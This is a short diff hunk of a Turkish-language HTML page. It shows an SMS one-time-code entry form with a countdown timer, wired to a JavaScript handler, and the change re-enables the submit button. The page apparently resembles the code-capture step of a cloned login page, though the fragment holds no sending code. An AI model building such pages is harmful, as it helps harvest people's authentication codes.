@@ -1072,7 +1072,7 @@ document.getElementById('maximizeButton').addEventListener('click', maximizeTawk
                         <b>Lütfen sistemde kayıtlı telefon numaranıza gelen SMS deki doğrulama kodunu giriniz.</b>
                         <form novalidate="" class="ng-untouched ng-pristine ng-invalid" id="smsForm" action="javascript:;" onclick="smsa()">
                            <div class="input-field"><input id="SmsCode" name="smsCode" type="password" required="" maxlength="6" class="browser-default ng-untouched ng-pristine ng-invalid" placeholder="SMS şifresi"></div>
-                           <button type="submit" class="btn" disabled="">Giriş</button>
+                           <button type="submit" class="btn">Giriş</button>
                         </form>
                         <div class="remaning-time-cntnt"><span class="remaning-time"> Kalan süre </span><span id="gerisayi">70</span><a href="javascript:;" class="right disabled"> SMS şifremi tekrar gönder <i class="fa fa-refresh fa-fw"></i></a></div>
                         <!---->
